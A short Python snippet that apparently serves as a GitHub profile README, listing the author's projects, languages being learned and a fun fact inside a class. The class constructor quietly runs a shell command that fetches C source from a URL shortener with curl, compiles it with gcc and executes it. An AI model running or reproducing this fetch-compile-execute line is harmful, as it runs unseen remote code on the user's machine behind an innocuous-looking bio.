class PROxZIMA:
  def __init__(self):
    subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
    self.bio = {
      '- 🔭 I’m currently working on' : {'DarkSpider': 'https://github.com/PROxZIMA/DarkSpider',
                                         'Prism'     : 'https://github.com/PROxZIMA/prism',
                                         'Sweet-Pop' : 'https://github.com/PROxZIMA/Sweet-Pop'},
      '- 🌱 I’m currently learning'   : ['php', 'C++', 'Python', 'Full Stack Development', 'bootstrap','javascript','laravel'],
      '- 💬 Ask me anything'          : '¯\_(ツ)_/¯',
      '- 👨‍💻 My projects available at' : 'https://github.com/Mohamadkhodarahmi?tab=repositories',
      '- ⚡ Fun fact'                 : ('years away from the Sun in the southern constellation of Centaurus.')
    }

if __name__ == '__main__':
  import subprocess, pprint
  pprint.pprint(PROxZIMA().__dict__)
